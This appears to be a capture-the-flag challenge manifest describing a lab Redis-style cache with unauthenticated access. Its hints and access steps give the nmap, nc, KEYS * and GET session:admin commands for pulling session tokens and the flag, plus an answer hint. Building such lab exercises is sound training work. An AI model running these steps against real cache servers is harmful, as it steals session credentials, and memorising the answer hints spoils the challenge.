manifest_version: 1
id: redis_exposed_keys
kind: flag-node-generator
name: 'Cache: Exposed Redis Keys'
description: Redis-style cache with unauthenticated key listing and session material.
hint_template: Applications sometimes leave reusable secrets in cached records.
runtime:
  type: docker-compose
  compose_file: docker-compose.yml
  service: generator
env:
  SERVICE_VARIANT_ID: redis_exposed_keys
inputs:
- name: seed
  type: string
  required: true
- name: node_name
  type: string
  required: true
- name: flag_prefix
  type: string
  required: false
- name: service_port
  type: number
  required: false
  default: 16379
artifacts:
  requires:
  - Knowledge(ip)
  produces:
  - Flag(flag_id)
  - FlagDelivery(mode)
  - FlagFile(path)
  - File(path)
  - Directory(host, path)
  - PortForward(host, port)
  - Endpoint(path)
  - Version(service)
  - Token(service)
  - Misconfiguration(service)
injects:
- service
inject_candidate_paths:
- /data/redis
- /var/lib/redis
- /srv/cache/redis
- /opt/cache/session
access_instructions:
  title: Exposed Redis-Style Cache
  steps:
  - step: 1
    title: Connect to the cache service
    instructions: '```bash

      nc {{NODE}} {{PORT}}

      ```

      '
  - step: 2
    title: List keys and read the admin session
    instructions: '```text

      KEYS *

      GET session:admin

      GET {{FLAG_FILE}}

      ```

      '
  - step: 3
    title: Record the session marker
    instructions: Record the flag and token from the exposed cache entry.
hint_levels:
  low:
  - Applications sometimes leave reusable secrets in cached records.
  medium:
  - 'Service: Exposed Redis-Style Cache. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
  - |-
    Check the assigned port:
    ```bash
    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
    ```
  - This service accepts a line-oriented text protocol. Connect with nc, then enter the commands shown in the high hint in
    that same session.
  high:
  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
  - |-
    Connect to the cache service:
    ```bash
    nc {{THIS_NODE_NAME}} {{OUTPUT.PortForward(host, port)}}
    ```
  - |-
    List keys and read the admin session:
    ```text
    KEYS *
    GET session:admin
    GET {{OUTPUT.FlagFile(path)}}
    ```
